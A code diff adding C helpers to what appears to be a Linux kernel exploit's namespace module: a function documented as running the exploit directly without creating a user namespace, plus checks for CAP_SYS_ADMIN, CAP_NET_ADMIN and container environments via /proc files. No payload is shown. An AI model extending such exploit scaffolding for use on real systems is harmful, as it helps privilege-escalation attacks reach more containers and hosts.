@@ -216,3 +216,110 @@ fail:
     waitpid(child, NULL, 0);
     return -1;
 }
+
+/**
+ * userns_run_direct - Run exploit directly without namespace creation.
+ *
+ * Use this when already running as uid=0 with CAP_NET_ADMIN in a container,
+ * OR when running with CAP_SYS_ADMIN (which grants CAP_NET_ADMIN).
+ * This skips the clone(CLONE_NEWUSER|CLONE_NEWNET) call that fails in
+ * nested container environments or when running as non-root with capabilities.
+ *
+ * @fn:  Function to run directly
+ * @arg: Argument passed to fn
+ * Returns: exit status of fn, or -1 on error.
+ */
+int userns_run_direct(userns_child_fn_t fn, void *arg) {
+    printf("[+] Running directly (uid=%d euid=%d, no new namespace)\n",
+           getuid(), geteuid());
+    return fn(arg);
+}
+
+/**
+ * userns_check_cap_sys_admin - Check if binary has CAP_SYS_ADMIN capability.
+ *
+ * Returns: 1 if CAP_SYS_ADMIN is set, 0 otherwise.
+ */
+int userns_check_cap_sys_admin(void) {
+    FILE *f = fopen("/proc/self/status", "r");
+    if (!f)
+        return 0;
+
+    char line[256];
+    int has_cap = 0;
+    while (fgets(line, sizeof(line), f)) {
+        if (strncmp(line, "CapEff:", 6) == 0) {
+            unsigned long long cap;
+            if (sscanf(line + 7, "%llx", &cap) == 1) {
+                has_cap = (cap & (1ULL << 21)) != 0;
+            }
+            break;
+        }
+    }
+    fclose(f);
+    return has_cap;
+}
+
+/**
+ * userns_check_cap_net_admin - Check if binary has CAP_NET_ADMIN capability.
+ *
+ * Returns: 1 if CAP_NET_ADMIN is set, 0 otherwise.
+ */
+int userns_check_cap_net_admin(void) {
+    FILE *f = fopen("/proc/self/status", "r");
+    if (!f)
+        return 0;
+
+    char line[256];
+    int has_cap = 0;
+    while (fgets(line, sizeof(line), f)) {
+        if (strncmp(line, "CapEff:", 6) == 0) {
+            unsigned long long cap;
+            if (sscanf(line + 7, "%llx", &cap) == 1) {
+                has_cap = (cap & (1ULL << 12)) != 0;
+            }
+            break;
+        }
+    }
+    fclose(f);
+    return has_cap;
+}
+
+/**
+ * userns_check_container - Detect if running in a container with uid=0.
+ *
+ * Returns: 1 if container detected, 0 otherwise.
+ */
+int userns_check_container(void) {
+    if (getuid() != 0 || geteuid() != 0)
+        return 0;
+
+    FILE *f = fopen("/proc/1/cgroup", "r");
+    if (f) {
+        char line[256];
+        while (fgets(line, sizeof(line), f)) {
+            if (strstr(line, "docker") || strstr(line, "containerd") ||
+                strstr(line, "crio") || strstr(line, "kubepods") ||
+                strstr(line, "container")) {
+                fclose(f);
+                return 1;
+            }
+        }
+        fclose(f);
+    }
+
+    FILE *m = fopen("/proc/1/mountinfo", "r");
+    if (m) {
+        char line[1024];
+        while (fgets(line, sizeof(line), m)) {
+            if (strstr(line, "containerd") || strstr(line, "docker") ||
+                strstr(line, "crio")) {
+                fclose(m);
+                return 1;
+            }
+        }
+        fclose(m);
+    }
+
+    return 0;
+}
